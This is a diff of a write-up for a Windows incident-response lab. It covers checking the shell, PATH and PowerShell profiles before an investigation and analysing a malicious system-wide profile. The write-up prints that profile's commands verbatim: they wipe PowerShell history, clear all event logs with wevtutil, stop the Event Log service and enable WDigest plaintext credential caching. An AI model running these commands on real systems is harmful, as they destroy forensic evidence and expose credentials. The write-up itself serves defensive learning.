@@ -1,236 +1,376 @@
-# Windows Incident Surface - Task 2
-## Reliability of System Tools
+# Windows Incident Surface — Task 2
 
-> **Room:** Windows Incident Surface
-> **Focus:** Windows DFIR, PowerShell profiles, execution hijacking, and anti-forensics
-> **MITRE ATT&CK:** T1574.007, T1546.013, T1070.003, T1070.001, T1562.002, T1552.002
+## PowerShell Profiles, Execution Hijacking & Anti-Forensics
 
-## What This Task Was About
+> **Before investigating a Windows system, investigate the investigation environment itself.**
 
-Before investigating a Windows host, I need to know whether the tools I am using can be trusted. An attacker can modify the environment, redirect executables through PATH, place malicious PowerShell profiles, or load suspicious modules.
+---
 
-The main finding in this task was a malicious system-wide PowerShell profile. It ran automatically when PowerShell started and changed the host before the investigation could properly begin.
+# Mental Model
 
-## 1. Start with CMD
+```text
+Attacker modifies PowerShell profile
+            ↓
+Responder launches PowerShell
+            ↓
+Malicious profile executes automatically
+            ↓
+History deleted + Logs cleared + Logging stopped + Credentials weakened
+            ↓
+Investigator starts with incomplete evidence
+```
 
-The lab provided this CMD environment:
+### Main Question
 
-~~~text
+> **Can I trust PowerShell before using it for investigation?**
+
+This is the mindset for the entire task.
+
+---
+
+# 1. Start With CMD
+
+If PowerShell has a malicious startup profile, simply launching it executes the attacker's code.
+
+The lab starts with:
+
+```text
 C:\Users\Administrator\Desktop\tools\shells\CMD-DFIR.exe
-~~~
+```
 
-I started with this shell because launching PowerShell could automatically execute a malicious profile. The CMD environment let me inspect the profile and environment first.
+### Investigation Principle
 
-> The lab calls this shell trusted. In a real investigation, I would still verify its source, hash, and digital signature.
+```text
+Don't immediately execute the potentially compromised tool.
+              ↓
+Use another environment to inspect it first.
+```
 
-## 2. Check the Environment
+In a real investigation, also verify the "trusted" tool through its source, hash, signature, and integrity.
 
-I saved the current environment variables and displayed them:
+---
 
-~~~cmd
+# 2. Inspect Environment Variables
+
+### Question
+
+> Could the attacker have modified the environment so commands or modules resolve from suspicious locations?
+
+```cmd
 set > env_vars.txt
 type env_vars.txt
-~~~
+```
 
-The important variables were:
+| Variable       | Purpose                            |
+| -------------- | ---------------------------------- |
+| `ComSpec`      | Current command interpreter        |
+| `Path`         | Controls executable search order   |
+| `PSModulePath` | PowerShell module search locations |
+| `TEMP` / `TMP` | Temporary file locations           |
+| `USERPROFILE`  | User profile location              |
 
-| Variable | Why I checked it |
-| --- | --- |
-| ComSpec | Shows which command interpreter is being used. |
-| Path | Controls the order Windows uses to find executables. |
-| PSModulePath | Shows where PowerShell searches for modules. |
-| TEMP and TMP | Common locations for staging files and payloads. |
-| USERPROFILE | Helps identify the user's PowerShell profile paths. |
+### PATH Investigation
 
-An unusual path is not automatically malicious. I would check whether the directory is writable by an untrusted user and compare it with a known-good system.
+Windows searches PATH directories when resolving executables:
 
-## 3. Check Which PowerShell Runs
+```text
+Command → Search PATH directories → First matching executable → Execute
+```
 
-I used where to see which executable Windows would resolve:
+If an attacker-controlled or user-writable directory appears before system directories, it can be used for execution hijacking.
 
-~~~cmd
+An unusual path **does not automatically mean compromise**.
+
+Investigate:
+- Is the directory expected?
+- Who can write to it?
+- Does it contain suspicious executables?
+- Does it differ from a known-good system?
+
+---
+
+# 3. Verify PowerShell Resolution
+
+### Question
+
+> Which `powershell.exe` will Windows actually execute?
+
+```cmd
 where powershell.exe
-~~~
+```
 
-Output:
+Expected result:
 
-~~~text
+```text
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-~~~
+```
 
-The PowerShell home directory was:
+**Why:** You don't want to assume that typing `powershell.exe` will execute the legitimate Windows binary. Verify first.
 
-~~~text
-$PSHOME = C:\Windows\System32\WindowsPowerShell\v1.0\
-~~~
+---
 
-Multiple results or a user-writable directory appearing before the Windows path would be a possible PATH hijacking indicator.
+# 4. PowerShell Profiles
 
-## 4. Check PowerShell Profiles
+A PowerShell profile is a startup script that automatically executes commands when PowerShell starts.
 
-PowerShell profiles are scripts that can run during startup. The Windows PowerShell profile locations are:
+Four major scopes:
 
-| Scope | Profile path |
-| --- | --- |
-| Current user, current host | $HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1 |
-| All users, current host | $PSHOME\Microsoft.PowerShell_profile.ps1 |
-| Current user, all hosts | $HOME\Documents\WindowsPowerShell\profile.ps1 |
-| All users, all hosts | $PSHOME\profile.ps1 |
+| Scope                     | Profile                                                              |
+| ------------------------- | -------------------------------------------------------------------- |
+| Current user / current host | `$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` |
+| All users / current host  | `$PSHOME\Microsoft.PowerShell_profile.ps1`                           |
+| Current user / all hosts  | `$HOME\Documents\WindowsPowerShell\profile.ps1`                      |
+| **All users / all hosts** | **`$PSHOME\profile.ps1`**                                            |
 
-The all-users/all-hosts profile has the widest impact.
+The most dangerous profile:
 
-I checked for it from CMD:
+```text
+C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
+```
 
-~~~cmd
+Because it is system-wide, it affects PowerShell sessions for **all users**.
+
+### Check If It Exists
+
+```cmd
 if exist "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" (echo EXISTS) else (echo NOT FOUND)
-~~~
+```
 
-Output:
+A profile existing does **not** prove it is malicious:
 
-~~~text
-EXISTS
-~~~
+```text
+Profile exists → Inspect contents → Understand behaviour → Determine whether legitimate
+```
 
-The file existing was not enough to prove compromise, but it was the first important artefact to inspect because it could affect every user.
+---
 
-## 5. Suspicious Startup Message
+# 5. Observe PowerShell Startup
 
-When PowerShell started, it printed:
+When PowerShell was started, it displayed:
 
-~~~text
+```text
 Less Murphy Ventures Co. Ps-History-Shredder Profile
-~~~
+```
 
-This message confirmed that a profile was executing during startup. The wording was also suspicious because it directly referred to deleting PowerShell history.
+The message explicitly refers to **history shredding** — a clue, not proof by itself. This leads to further investigation.
 
-## 6. Read the Profile
+### Read the Profile Without Trusting It
 
-I read the profile from the trusted CMD window:
-
-~~~cmd
+```cmd
 type "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
-~~~
+```
 
-The contents were:
+---
 
-~~~powershell
+# 6. What the Malicious Profile Did
+
+### A. PowerShell History Destruction — T1070.003
+
+```powershell
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-Write-Host "Less Murphy Ventures Co. Ps-History-Shredder Profile" -ForegroundColor Green
-Write-Host "Loading Secure Console" -ForegroundColor Green
+```
+
+```text
+Existing history → DELETE IT
+Future history   → DON'T SAVE IT
+```
+
+PowerShell history can provide useful evidence about commands executed by an attacker. Deleting and disabling it makes command-line investigation harder.
+
+### B. Clear Windows Event Logs — T1070.001
+
+```powershell
 wevtutil el | ForEach-Object { wevtutil cl $_ }
+```
+
+```text
+wevtutil el → Enumerate logs → ForEach-Object → wevtutil cl → Clear each log
+```
+
+Windows event logs can contain evidence of authentication, system activity, security events, process activity.
+
+**Room Answer:** The tool used to delete logs: `wevtutil`
+
+### C. Stop Event Logging — T1562.002
+
+```powershell
 Stop-Service -Name "eventlog" -Force
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -PropertyType DWORD -Force
-Set-Location "$Env:UserProfile\Desktop"
-~~~
+```
 
-### What the Commands Did
+```text
+Clear logs  = Delete existing evidence
+Stop service = Prevent future evidence
+```
 
-| Command or behaviour | Meaning |
-| --- | --- |
-| Set-PSReadlineOption -HistorySaveStyle SaveNothing | Stops future PowerShell commands from being saved in history. Maps to T1070.003. |
-| Remove-Item ... HistorySavePath | Deletes the existing PSReadLine history file. Maps to T1070.003. |
-| wevtutil el | ForEach-Object { wevtutil cl $_ } | Lists all event logs and clears them. Maps to T1070.001. |
-| Stop-Service -Name "eventlog" -Force | Attempts to stop the Windows Event Log service. Maps to T1562.002. |
-| UseLogonCredential = 1 in WDigest | Enables legacy plaintext credential caching for future logons. Maps to T1552.002. |
-| Set-Location "$Env:UserProfile\Desktop" | Changes the starting directory to the user's Desktop. |
-| Write-Host ... | Displays the fake startup messages and confirms profile execution. |
+Together they provide stronger anti-forensic capability.
 
-The combination of history deletion, event-log clearing, service disruption, and weaker credential protection makes this clearly malicious. It is not just an unusual profile.
+### D. Modify WDigest — T1552.002
 
-## Room Answers
-
-### What tool did the adversary use to delete the logs?
-
-~~~text
-wevtutil
-~~~
-
-The profile used wevtutil el to enumerate the logs and wevtutil cl to clear them.
-
-### What registry path was used to store or expose login credentials?
-
-~~~text
+```text
 HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
-~~~
-
-The value modified was:
-
-~~~text
 UseLogonCredential = 1
-~~~
+```
 
-This setting does not directly dump credentials. It enables legacy WDigest behaviour that can leave plaintext credentials in memory after future logons, making credential theft easier.
+```text
+WDigest changed → Future logon → Credential material stays in memory → Theft easier
+```
 
-## Remediation Notes
+The setting does **not directly dump credentials**. Instead it prepares for easier theft at the next logon.
 
-The suspicious profile should be preserved before replacement. In a real incident, I would collect the file, hash, timestamps, permissions, and other metadata before changing the host.
+**Room Answer:**  
+- Registry path: `HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`  
+- Value: `UseLogonCredential`
 
-The lab remediation was:
+### E. Fake Startup Messages
 
-~~~cmd
+```powershell
+Write-Host "Less Murphy Ventures Co. Ps-History-Shredder Profile"
+Write-Host "Loading Secure Console"
+```
+
+These make the startup appear legitimate while malicious actions run in the background.
+
+> **Don't trust a tool because its output looks professional or legitimate. Verify its behaviour.**
+
+### F. Change Working Directory
+
+```powershell
+Set-Location "$Env:UserProfile\Desktop"
+```
+
+Not inherently malicious — a reminder that malicious scripts can contain both normal and harmful actions. Analyze **behaviour**, not individual commands.
+
+---
+
+# 7. Why the Profile Is Malicious
+
+The strongest evidence is the combination of actions:
+
+```text
+Disable PowerShell history
+          +
+Delete existing history
+          +
+Clear event logs
+          +
+Stop event logging
+          +
+Weaken credential protection
+→ Designed to remove evidence, prevent collection, disrupt logging, and weaken security
+```
+
+---
+
+# 8. Preserve Before Remediate
+
+### DFIR Principle
+
+```text
+Preserve → Analyze → Remediate
+```
+
+Not: `Delete → Problem solved`
+
+```cmd
 ren C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 profile.bak
-ren PS-DFIR-Profile.ps1 profile.ps1
-copy profile.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\
-~~~
+```
 
-After replacement, PowerShell displayed:
+`profile.bak` preserves the malicious artefact for analysis.
 
-~~~text
-DFIR Profile
-~~~
+In a real investigation, collect: hash, timestamps, file permissions, owner, digital signature, contents.
 
-Renaming the malicious file keeps it available for analysis. Deleting it would destroy evidence.
+---
 
-> These commands modify the host. They are appropriate for the lab, but should not be run on a real system without an approved response plan and evidence preservation.
+# 9. Check PowerShell Modules
 
-## PowerShell Module Check
+Attackers can also abuse PowerShell modules.
 
-PowerShell modules can also contain malicious code. After restoring the profile, I checked loaded and available modules:
-
-~~~powershell
-# Modules loaded in the current session
+```powershell
 Get-Module | Format-Table ModuleType, Version, Name
-
-# Modules available to PowerShell
-Get-Module -ListAvailable |
-    Select-Object ModuleType, Version, Name
-~~~
-
-Any unfamiliar module should be checked for its file path, timestamps, owner, digital signature, hash, and contents:
-
-~~~powershell
+Get-Module -ListAvailable | Select-Object ModuleType, Version, Name
 Get-Module -ListAvailable -Name <ModuleName> | Format-List *
 Get-Command -Module <ModuleName>
-~~~
+```
 
-The results should be compared with a known-good system or an approved software baseline.
+Investigate: Path, Timestamp, Owner, Digital signature, Hash, Contents.
 
-## Attack Flow
+Compare suspicious modules against a known-good or approved system.
 
-~~~text
-Malicious profile is placed in the all-users/all-hosts location
-        |
-        v
-PowerShell runs it automatically
-        |
-        +--> PowerShell history is disabled and deleted
-        +--> Windows event logs are cleared
-        +--> Event logging is stopped
-        +--> WDigest credential protection is weakened
-        |
-        v
-The responder investigates with missing evidence and a modified environment
-~~~
+---
 
-## Takeaways
+# 10. Attack Story
 
-- Validate the shell and tools before trusting their output.
-- Check startup mechanisms before running investigation commands.
-- A system-wide PowerShell profile affects every user and host using that installation.
-- wevtutil was used to clear the Windows event logs.
-- The WDigest registry change weakened credential protection.
-- Preserve suspicious files before remediation.
-- The important skill is recognising the investigation problem, then choosing the command that answers it.
+```text
+Malicious system-wide PowerShell profile
+                ↓
+Automatic execution
+                ↓
+PowerShell history disabled + existing history deleted
+                ↓
+Windows event logs cleared + Event Log service stopped
+                ↓
+WDigest configuration modified → Credential protection weakened
+                ↓
+Investigator starts with reduced evidence
+```
 
-**Reference:** [TryHackMe - Windows Incident Surface](https://tryhackme.com/room/winincidentsurface)
+---
+
+# 11. Investigation Workflow
+
+```text
+Can I trust the shell?
+        ↓
+Inspect environment → Check PATH → Verify executable resolution
+        ↓
+Check PowerShell profiles → Inspect startup behaviour → Read profile contents
+        ↓
+Identify anti-forensics → Identify security weakening
+        ↓
+Preserve suspicious artefacts → Remediate → Verify clean environment
+```
+
+---
+
+# Quick Cheat Sheet
+
+| Question                        | Command / Location                     |
+| ------------------------------- | -------------------------------------- |
+| Inspect environment             | `set`                                  |
+| Check PowerShell resolution     | `where powershell.exe`                 |
+| Check system-wide profile       | `$PSHOME\profile.ps1`                  |
+| Read profile (without trusting) | `type ...\profile.ps1`                 |
+| List loaded modules             | `Get-Module`                           |
+| List available modules          | `Get-Module -ListAvailable`            |
+| Investigate module commands     | `Get-Command -Module <ModuleName>`     |
+| Clear Windows logs (attacker)   | `wevtutil cl`                          |
+| PowerShell history manipulation | `Set-PSReadlineOption` / `Remove-Item` |
+| Stop event logging              | `Stop-Service eventlog`                |
+| WDigest setting                 | `UseLogonCredential`                   |
+
+---
+
+# What I Learned
+
+### Core lesson
+
+> **Before investigating a Windows system, investigate the investigation environment itself.**
+
+- Check environment variables and `PATH`
+- Verify which PowerShell executable will actually run
+- Identify PowerShell startup profiles and their scopes
+- Inspect a profile's contents without blindly trusting it
+- Recognize PowerShell history destruction (T1070.003)
+- Identify Windows event-log clearing via `wevtutil` (T1070.001)
+- Recognize event logging disruption (T1562.002)
+- Identify WDigest security weakening (T1552.002)
+- Investigate PowerShell modules for suspicious entries
+- Preserve malicious artefacts before remediation
+
+### Most important mindset
+
+```text
+Don't ask: "What command gets the answer?"
+Ask:       "Can I trust the environment giving me the answer?"
+```
